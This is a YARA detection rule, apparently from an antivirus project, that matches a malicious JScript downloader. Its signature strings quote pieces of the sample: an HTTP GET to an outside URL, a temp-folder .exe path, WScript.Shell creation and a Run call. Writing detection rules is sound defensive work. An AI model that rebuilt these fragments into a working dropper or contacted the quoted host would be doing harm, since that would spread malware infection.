rule sig_20160328_b32a8341c5f20d272ce9a877f81d1734 {
  meta:
    description = "datamaliciousorder - file 20160328_b32a8341c5f20d272ce9a877f81d1734.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "924e68badf5d7c0ad32b6f9adab4c4a9b5ce399dcc24b601dbc73b01f2be83db"

  strings:
    $s1  = "function Yxgtvtvg() {return Wqmmofjuk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"dpyR0O6z11XvGnlC.exe\";};" fullword ascii
    $s2  = "Unltwi[Qrmmeovvbb](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "var Wqmmofjuk = function Psdned() {return WScript[Mnsddihyk](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Ufszlrcz(Tiparqd, Vbcxodesjh){return Tiparqd - Vbcxodesjh;};" fullword ascii
    $s5  = "do {WScript[Xqcaozye](Cwvtubs() * 11)} while (Unltwi[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Ptddmdt(Gvrpud){Wqmmofjuk[\"Run\"](Gvrpud, Zhviwbh, Zhviwbh);};" fullword ascii
    $s7  = "function Lcgpwtbhpa() {return ((Dtoqfkf == true) && (Dtoqfkf == Ykbkbfwi)) ? 1 : Zhviwbh;};" fullword ascii
    $s8  = "function Sntqzn(Cxzpguqbn) {var Vmyjiobbsh = (1, 2, 3, 4, 5, Cxzpguqbn); return Vmyjiobbsh;};" fullword ascii
    $s9  = " while (Sdqpphueap){" fullword ascii
    $s10 = "var Mxfrk = false;" fullword ascii
    $s11 = "Ykbkbfwi = true; " fullword ascii
    $s12 = "var Etfmdebuo = new this[\"Date\"]();" fullword ascii
    $s13 = "Dtoqfkf = true; " fullword ascii
    $s14 = "return Ufszlrcz(Zaoutts, Qaiwih);" fullword ascii
    $s15 = "function Cwvtubs(){return 22;};" fullword ascii
    $s16 = "var Ykbkbfwi = false;" fullword ascii
    $s17 = "function Cjargicnzn()" fullword ascii
    $s18 = "var Dtoqfkf = false;" fullword ascii
    $s19 = "function Upppjx(){return Mnsddihyk;};" fullword ascii
    $s20 = "function Khabcdujb(){return Bltjwfqqx;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}